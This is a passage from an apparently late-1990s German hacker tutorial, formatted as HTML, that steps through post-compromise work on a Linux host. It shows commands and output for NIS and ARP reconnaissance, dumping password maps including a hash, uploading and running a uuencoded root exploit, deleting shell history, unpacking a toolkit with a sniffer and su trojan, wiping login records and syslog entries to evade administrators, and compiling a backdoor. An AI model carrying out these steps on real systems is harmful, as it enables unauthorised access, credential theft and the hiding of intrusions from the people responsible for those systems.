+geloescht hat. Wie es aussieht ist 'johnny' der einzige User, der online
+ist.</font>
+<p><font color="#FF0000">victim % domainname</font>
+<br><font color="#FF0000">korn.domain.nis</font>
+<br><font color="#FF0000">victim %&nbsp; ypwhich</font>
+<br><font color="#FF0000">chi</font>
+<br><font color="#FF0000">victim % ypcat ypservers</font>
+<br><font color="#FF0000">chi</font>
+<br><font color="#FF0000">fieldy</font>
+<p><font color="#000000">So, als erstes holen wir uns Infos ueber deren
+NIS. Den NIS-Domainname und den NIS-Server koennen wir spaeter benutzen
+um diverse NIS-Maps zu transferieren; z.B. die <i>Passwd-Map </i>nachdem
+wir rausgeflogen sind. NIS ist fast zu 100% in den Domains installiert.
+Nur wenige benutzen rdist, NIS+ oder DCE. Ein Program, das uns den Zugriff
+auf den NIS-Server ermoeglich heisst <b>ypx</b>.</font>
+<p><font color="#FF0000">victim% arp -a</font>
+<br><font color="#FF0000">fred.domain.com (10.255.0.4) at 00:C0:24:A4:3B:B2
+[ether] on eth0</font>
+<br><font color="#FF0000">bambam.domain.com (10.255.0.3) at 00:00:0C:A1:32:F2
+[ether] on eth0</font>
+<br><font color="#FF0000">hombre.domain.com (10.255.0.43) at 08:00:02:C1:FB:32
+[ether] on eth0</font>
+<br><font color="#FF0000">deep.domain.com (10.255.0.24) at 00:05:02:E1:12:B2
+[ether] on eth0</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#000000">Ein kurzer Blick in den ARP Cache des Rechners
+zeigt uns welche Hardware im Netz verwendet wird. Die ersten drei Bytes
+der Ethernet-Adresse sind ein Indikator fuer den Hersteller der Netzkarte.</font>
+<br><font color="#000000">fred -> unbekannt, evtl. PC</font>
+<br><font color="#000000">bambam -> Cisco Router</font>
+<br><font color="#000000">hombre -> Sun Microsystems</font>
+<br><font color="#000000">deep -> Apple Mac.</font>
+<br><font color="#000000">Natuerlich gibt's noch andere bekannte Hersteller:
+HP, SGI, Cray...</font>
+<p><font color="#FF0000">victim% uname -a</font>
+<br><font color="#FF0000">Linux wallace 2.0.33 #4 Sun Jul 6 11:43:22 MEST
+1998 686 unknown</font>
+<br><font color="#FF0000">victim % ypcat passwd</font>
+<br><font color="#FF0000">proj:FbxcM/NyIxf7w:501:100:Project Account:/home/proj:/bin/bash</font>
+<br><font color="#FF0000">test:x:502:100:Test Account:/home/test:/bin/bash</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % cat /etc/passwd</font>
+<br><font color="#FF0000">root:x:0:0:root:/root:/bin/bash</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % ypcat group</font>
+<br><font color="#FF0000">root:x:0:root</font>
+<br><font color="#FF0000">bin:x:1:root,bin,daemon</font>
+<br><font color="#FF0000">daemon:x:2:</font>
+<br><font color="#FF0000">tty:x:5:</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % cat /etc/group</font>
+<br><font color="#FF0000">root:x:0:root</font>
+<br><font color="#FF0000">bin:x:1:root,bin,daemon</font>
+<br><font color="#FF0000">daemon:x:2:</font>
+<br><font color="#FF0000">tty:x:5:</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % ypcat hosts</font>
+<br><font color="#FF0000">127.0.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+localhost</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % cat /etc/hosts</font>
+<br><font color="#FF0000">127.0.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+localhost</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % cat /etc/syslog.conf</font>
+<br><font color="#FF0000"># /etc/syslog.conf - Configuration file for syslogd(8)</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># For info about the format of this file, see
+"man syslog.conf".</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># print most on tty10</font>
+<br><font color="#FF0000">kern.warn;*.err;authpriv.none&nbsp;&nbsp; /dev/tty10</font>
+<br><font color="#FF0000">*.emerg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">victim % cat&nbsp; /etc/inetd.conf</font>
+<br><font color="#FF0000"># See "man 8 inetd" for more information.</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># If you make changes to this file, either reboot
+your machine or send the</font>
+<br><font color="#FF0000"># inetd a HUP signal:</font>
+<br><font color="#FF0000"># Do a "ps x" as root and look up the pid of
+inetd. Then do a</font>
+<br><font color="#FF0000"># "kill -HUP &lt;pid of inetd>".</font>
+<br><font color="#FF0000"># The inetd will re-read this file whenever it
+gets that signal.</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># &lt;service_name> &lt;sock_type> &lt;proto>
+&lt;flags> &lt;user> &lt;server_path> &lt;args></font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># echo&nbsp; stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp;
+nowait&nbsp; root&nbsp;&nbsp;&nbsp; internal</font>
+<br><font color="#FF0000"># echo&nbsp; dgram&nbsp;&nbsp; udp&nbsp;&nbsp;&nbsp;&nbsp;
+wait&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; internal</font>
+<br><font color="#FF0000"># discard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp; nowait&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># discard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dgram&nbsp;&nbsp; udp&nbsp;&nbsp;&nbsp;&nbsp; wait&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># daytime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp; nowait&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># daytime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dgram&nbsp;&nbsp; udp&nbsp;&nbsp;&nbsp;&nbsp; wait&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># chargen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp; nowait&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># chargen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dgram&nbsp;&nbsp; udp&nbsp;&nbsp;&nbsp;&nbsp; wait&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;
+internal</font>
+<br><font color="#FF0000"># time&nbsp; stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp;
+nowait&nbsp; root&nbsp;&nbsp;&nbsp; internal</font>
+<br><font color="#FF0000"># time&nbsp; dgram&nbsp;&nbsp; udp&nbsp;&nbsp;&nbsp;&nbsp;
+wait&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; internal</font>
+<br><font color="#FF0000">[...]</font>
+<p>Jetzt haben wir alle Informationen die wir benoetigen um die Log-Verwaltung
+zu analysieren und um unseren Zugriff zu festigen/wiederzuerlangen.
+<p><font color="#FF0000">victim % mkdir /tmp/".. "</font>
+<br><font color="#FF0000">victim % cd /tmp/".. "</font>
+<br><font color="#FF0000">victim % uudecode</font>
+<br><font color="#FF0000">begin 644 mexpl.gz</font>
+<br><font color="#FF0000">M"B,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,*(PD)"0D)"0D)</font>
+<br><font color="#FF0000">M"2`@("`@(",*(PD@("`@(%5.25@@26YT97)A8W1I=F4@5&amp;]O;',@-"XR8B!C</font>
+<br><font color="#FF0000">M;VYF:6=U&lt;F%T:6]N(&amp;9I;&amp;4)"2`@("`@(",*(PD@($-O&lt;'ER:6=H="`H8RD@</font>
+<br><font color="#FF0000">M5'5D;W(@2'5L=6)E:2`F($%N9')E:2!0:71I&lt;RP@36%Y(#$Y.30)("`@("`@</font>
+<br><font color="#FF0000">M"2`@("`@(",*(PD)"0D)"0D)"2`@("`@(",*(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(PH*"B,*(R!X=&amp;5R;2!C;VYF:6=U&lt;F%T:6]N(&amp;9I</font>
+<br><font color="#FF0000">M;&amp;4@*%@@=VEN9&amp;]W('-Y&lt;W1E;2DN"B,@268@>6]U(&amp;%R92!U&lt;VEN9R!C;VQO</font>
+<br><font color="#FF0000">M&lt;E]X=&amp;5R;2!C;VYS:61E&lt;B!C:&amp;%N9VEN9R!,:6YU>$-O;G-O;&amp;4@86YD"B,@</font>
+<br><font color="#FF0000">M0V]L;W)-;VYI=&amp;]R('1O($].+@HC"@H*(PHC("`M($EF("=,:6YU>$-O;&amp;]R</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">victim % ls -altr</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 2 johnny users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+1024 Jul&nbsp; 6 11:39 .</font>
+<br><font color="#FF0000">drwxrwxrwt&nbsp;&nbsp; 7 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul&nbsp; 6 11:39
+..</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp; 1 johnny users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+2345&nbsp; Jul&nbsp; 5&nbsp; 11:41 mexpl.gz</font>
+<br><font color="#FF0000">victim % gunzip *.gz</font>
+<br><font color="#FF0000">victim % chmod u+x mexpl</font>
+<br><font color="#FF0000">victim % mexpl</font>
+<br><font color="#FF0000">bash# whoami</font>
+<br><font color="#FF0000">root</font>
+<br><font color="#FF0000">bash# unset HISTFILE</font>
+<br><font color="#FF0000">bash# rm ~/.bash_history</font>
+<p><font color="#000000">Als erstes haben wir ein Arbeitsdirec. eingerichtet
+und anschliessend wurde das Binary eines mount-Exploits,</font>
+<br><font color="#000000">welches zuvor <b>uuencode</b>'d wurde, uebertragen.</font>
+<br><font color="#000000">Das Transferieren des Images ist recht simpel
+(Verwendung eines Terminalprog.s, keine PPP/IP Verbindung)</font>
+<br><font color="#FF0000">needle > uuencode mexpl.gz mexpl.gz > /dev/modem</font>
+<br><font color="#000000">Nur fuer den Fall, dass ich - aus welchen Gruenden
+auch immer - den Compiler einses Systems nicht benutzen kann, sammel ich
+von meinen Hackertools und Exploits die Binaries der verschiedenen Plattformen
+um sie wie oben gezeigt zu uebertragen.</font>
+<p><font color="#FF0000">bash# uudecode</font>
+<br><font color="#FF0000">begin 644 tools.tar.gz</font>
+<br><font color="#FF0000">M"B,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,*(PD)"0D)"0D)</font>
+<br><font color="#FF0000">M"2`@("`@(",*(PD@("`@(%5.25@@26YT97)A8W1I=F4@5&amp;]O;',@-"XR8B!C</font>
+<br><font color="#FF0000">M;VYF:6=U&lt;F%T:6]N(&amp;9I;&amp;4)"2`@("`@(",*(PD@($-O&lt;'ER:6=H="`H8RD@</font>
+<br><font color="#FF0000">M5'5D;W(@2'5L=6)E:2`F($%N9')E:2!0:71I&lt;RP@36%Y(#$Y.30)("`@("`@</font>
+<br><font color="#FF0000">M"2`@("`@(",*(PD)"0D)"0D)"2`@("`@(",*(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C</font>
+<br><font color="#FF0000">M(R,C(R,C(R,C(R,C(R,C(PH*"B,*(R!X=&amp;5R;2!C;VYF:6=U&lt;F%T:6]N(&amp;9I</font>
+<br><font color="#FF0000">M;&amp;4@*%@@=VEN9&amp;]W('-Y&lt;W1E;2DN"B,@268@>6]U(&amp;%R92!U&lt;VEN9R!C;VQO</font>
+<br><font color="#FF0000">M&lt;E]X=&amp;5R;2!C;VYS:61E&lt;B!C:&amp;%N9VEN9R!,:6YU>$-O;G-O;&amp;4@86YD"B,@</font>
+<br><font color="#FF0000">M0V]L;W)-;VYI=&amp;]R('1O($].+@HC"@H*(PHC("`M($EF("=,:6YU>$-O;&amp;]R</font>
+<br><font color="#FF0000">M0V]N&lt;V]L92&lt;@86YD("=#;VQO&lt;DUO;FET;W(G(&amp;%R92!B;W1H($].+"!;54E4</font>
+<br><font color="#FF0000">M>'AX+4-O;&amp;]R70HC(&amp;1E&lt;V-R:7!T:6]N&lt;R!W:6QL(&amp;)E('5S960N"B,@("T@</font>
+<br><font color="#FF0000">M268@>6]U(&amp;%R92!W;W)K:6YG(&amp;]N(&amp;$@3&amp;EN=7@@&lt;WES=&amp;5M(&amp;)U="!Y;W4@</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">bash# tar xvzf tools.tar.gz</font>
+<br><font color="#FF0000">searcher</font>
+<br><font color="#FF0000">smeagol_v4.4.4.tar</font>
+<br><font color="#FF0000">clear13b.c</font>
+<br><font color="#FF0000">su-trojan</font>
+<br><font color="#FF0000">linsniffer.c</font>
+<br><font color="#FF0000">srm.c</font>
+<br><font color="#FF0000">ifconfig</font>
+<br><font color="#FF0000">fix</font>
+<br><font color="#FF0000">askhandle</font>
+<br><font color="#FF0000">bash# gcc -o cb clear13b.c</font>
+<br><font color="#FF0000">bash# ./cb johnny</font>
+<br><font color="#FF0000">wtmp ... utmp ... lastlog ... Done!</font>
+<br><font color="#FF0000">Last entry cleared from user johnny</font>
+<br><font color="#FF0000">bash# w</font>
+<br><font color="#FF0000">&nbsp; 3:28pm&nbsp; up&nbsp; 4:33h,&nbsp; 0 users,&nbsp;
+load average: 0.42, 0.15, 0.04</font>
+<br><font color="#FF0000">USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TTY&nbsp;&nbsp;&nbsp;
+LOGIN@&nbsp; IDLE&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; WHAT</font>
+<br><font color="#FF0000">bash#</font>
+<p>Ziiip!... Mit <b>clear13b</b> haben wir unsere aktuellen Eintraege aus
+<font color="#33FF33">w</font><font color="#000000">/</font><font color="#33FF33">utmp</font><font color="#000000">[</font><font color="#33FF33">x</font><font color="#000000">]</font>und
+<font color="#33FF33">lastlog</font>
+entfernt. Du solltest darauf aufpassen, dass dein Logcleaner keine Loecher
+in den Dateien, d.h. die Eintraege einfach mit '0' ueberschreibt, hinterlaesst,
+denn die koennen leicht von Programmen des CERT's entdeckt werden.
+<br>Auf <i>Process-Accounting </i>musst du auch acht geben, denn dadurch
+kann der Admin entdecken welche Programme du ausgefuehrt hast. Auch wenn
+die Programme nicht ungewoehnlich aussehen sollten ist es immer noch sehr
+auffaellig, wenn ein User, der keine Eintraege in den regulaeren Logfiles
+besitzt, ein Programm <font color="#000000">aufgerufen</font> hat.
+<br>Zum Glueck wird <i>Process-Accounting </i>nur selten benutzt, da das
+Logfile sehr schnell waechst. Das Logfile heisst <font color="#33FF33">acct</font>
+oder <font color="#33FF33">pacct</font> und befindet sich mit den anderen
+Logfiles im selben Direc..
+<br>Auf besonders schnellen/grossen Rechnern (Cray) ist das <i>Process-Accounting</i>
+fast immer aktiv, da hier die User fuer ihre Rechenzeit bezahlen muessen.
+<p><font color="#FF0000">bash# cd /var/log</font>
+<br><font color="#FF0000">bash# ls -altr</font>
+<br><font color="#FF0000">total 838</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp; 20 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 19:58
+..</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0 May 28 21:01 news</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 199 May 28 21:12
+httpd.error_log</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0 May 28 21:14 httpd.access_log</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3925 May 28 21:53
+Config.bootup</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jun 14 11:29
+.</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1871 Jul&nbsp; 7 09:04
+boot.msg</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 519707 Jul&nbsp; 7 09:04 warn</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15842 Jul&nbsp; 7 09:04
+mail</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 24 Jul&nbsp;
+7 13:42 faillog</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16096 Jul&nbsp; 7 13:42
+lastlog</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 92454 Jul&nbsp; 7 13:42
+messages</font>
+<br><font color="#FF0000">-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 207984 Jul&nbsp; 7 13:42
+wtmp</font>
+<br><font color="#FF0000">bash# grep source.ass *</font>
+<br><font color="#FF0000">messages: Jul&nbsp; 7 13:42:39 wallace in.telnetd[401]:
+connect from source.ass.com</font>
+<br><font color="#FF0000">bash# fuser messages</font>
+<br><font color="#FF0000">messages:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+85</font>
+<br><font color="#FF0000">bash# ps aux 85</font>
+<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; USER&nbsp;&nbsp; PID %CPU
+%MEM&nbsp;&nbsp; VSZ&nbsp;&nbsp; RSS&nbsp; TT STAT&nbsp; START&nbsp;&nbsp;
+TIME COMMAND</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+85&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0.8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 836&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+196&nbsp;&nbsp; ?&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+09:04&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; /usr/sbin/syslogd</font>
+<br><font color="#FF0000">bash# grep in.rlogind *</font>
+<br><font color="#FF0000">messages: Jul&nbsp; 7 13:41:56 wallace in.rlogind[384]:
+connect from johnny@victim.domain.com</font>
+<br><font color="#FF0000">bash# grep -v source.ass.com messages > m</font>
+<br><font color="#FF0000">bash# grep -v "Jul&nbsp; 7 13:41:56" m > messages</font>
+<br><font color="#FF0000">bash# cat /dev/zero > m</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#FF0000">bash# rm m</font>
+<br><font color="#FF0000">bash# ls -altr</font>
+<br><font color="#FF0000">total 838</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp; 20 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 19:58
+..</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0 May 28 21:01 news</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 199 May 28 21:12
+httpd.error_log</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0 May 28 21:14 httpd.access_log</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3925 May 28 21:53
+Config.bootup</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jun 14 11:29
+.</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1871 Jul&nbsp; 7 09:04
+boot.msg</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 519707 Jul&nbsp; 7 09:04 warn</font>
+<br><font color="#FF0000">-rw-r-----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15842 Jul&nbsp; 7 09:04
+mail</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 24 Jul&nbsp;
+7 13:42 faillog</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16096 Jul&nbsp; 7 13:42
+lastlog</font>
+<br><font color="#FF0000">-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 207984 Jul&nbsp; 7 13:42
+wtmp</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 92502 Jul&nbsp; 7 13:49
+messages</font>
+<p><font color="#000000">Hier haben wir uns die Syslog-Files nochmal genauer
+angesehen und unsere Spuren verwischt.</font>
+<br><font color="#000000">Mit <b>fuser</b> kannst du unter anderem die
+PID des Processes feststellen, welcher ein bestimmte Datei benutzt.</font>
+<br><font color="#000000">In diesem Fall gehoert, wie zu erwarten, die
+PID 85 zu <b>syslogd</b>. Wir benoetigen die PID um <b>syslogd</b> das
+HUP-Signal zu senden, welches <b>syslogd</b> veranlasst die Logfiles neu
+zu oeffnen. Dies ist noetig, weil <b>syslogd</b> sonst einen <i>Inode </i>benutzt
+zu dem es kein File mehr, in unserem Fall </font><font color="#33FF33">messages</font><font color="#000000">,
+im Verz.</font><font color="#33FF33"> /var/log</font><font color="#000000">
+existiert.</font>
+<br><font color="#000000">Das Dumme an der Sache ist nur, dass <b>syslogd</b>
+eine Restart-Message in die Logfiles schreibt.</font>
+<br><font color="#000000">Jetzt fragst du dich sicherlich: "Warum erzaehlt
+der Typ mir den ganzen Gammel und macht es dann selbst nicht?"</font>
+<br><font color="#000000">Die Antwort ist einfach: Wir erzeugen keinen
+neuen <i>Inode </i>indem wir die Daten kopieren und nicht moven. Somit
+vermeiden wir zusaetzlich die Restart-Message von <b>syslogd</b>.</font>
+<br><font color="#000000">Wenn <b>syslogd</b> wichtige Logs zur Console
+oder zu einem TTY schreibt (s. </font><font color="#33FF33">/etc/syslog.conf</font><font color="#000000">),
+dann kannst du mit:</font>
+<br><font color="#FF0000">bash# yes " " > /dev/console</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#000000">den Bildschirm loeschen.</font>
+<br><font color="#000000">Wenn Logs auf einem Printer</font> ausgedruckt
+werden, dann sieht's relativ schlecht aus. Entweder hoffst du, dass das
+Papier/das Farbband leer war oder, dass der Admin es nicht sieht. ;)
+<br>Es ist mit einiger Wahrscheinlichkeit auch moeglich das Papier um einige
+Zeile zurueckzuschieben und deine Entries mehrmals mit anderen Kram zu
+ueberschreiben. Ich hab's noch nie ausprobiert und ueberlasse es deiner
+Phantasie und deinem Koennen das Problem zu loesen.
+<br>Mehr 'Glueck' hat man da schon, wenn die Daten auf einen extra Loghost
+gehen (du kannst nur beten, das sie nicht einfach eine Serielle-Verbindung
+benutzen); den du dann natuerlich hacken musst; oder es besser sein laesst,
+weil du dadurch nur die Aufmerksamkeit der Admins auf dich ziehst.
+<br>Die ganz paranoiden unter euch (was nicht unbedingt schlecht ist) sollten
+noch <b>identd</b> ersetzen; der TCP-Wrapper, Firewalls, etc benutzen <b>identd</b>
+um den Usernamen auf dem Remote Host zu eruieren.
+<p><font color="#FF0000">bash# cd /tmp/".. "</font>
+<br><font color="#FF0000">bash# tar xf smeagol_v4.4.4.tar</font>
+<br><font color="#FF0000">bash# cd V4.4.4</font>
+<br><font color="#FF0000">bash# make</font>
+<br><font color="#FF0000">cp smeagol.h.gen smeagol.h</font>
+<br><font color="#FF0000">make -f Makefile.gen</font>
+<br><font color="#FF0000">make[1]: Entering directory `/tmp/.. /V4.4.4'</font>
+<br><font color="#FF0000">cc&nbsp; -c cmds.c</font>
+<br><font color="#FF0000">cc -DGENERIC -c remove.c</font>
+<br><font color="#FF0000">cc -c stdnet.c error.c</font>
+<br><font color="#FF0000">cc&nbsp; -c smeagol.c</font>
+<br><font color="#FF0000">cc -c tty-intruder.c</font>
+<br><font color="#FF0000">cc -c auth.c</font>
+<br><font color="#FF0000">cc&nbsp; -c ah.c</font>
+<br><font color="#FF0000">cc -c strhide.c</font>
+<br><font color="#FF0000">cc -O2 -o smeagol cmds.o remove.o stdnet.o error.o
+smeagol.o tty-intruder.o auth.o ah.o strhide.o</font>
+<br><font color="#FF0000">strip smeagol</font>
+<br><font color="#FF0000">make[1]: Leaving directory `/tmp/.. /V4.4.4'</font>
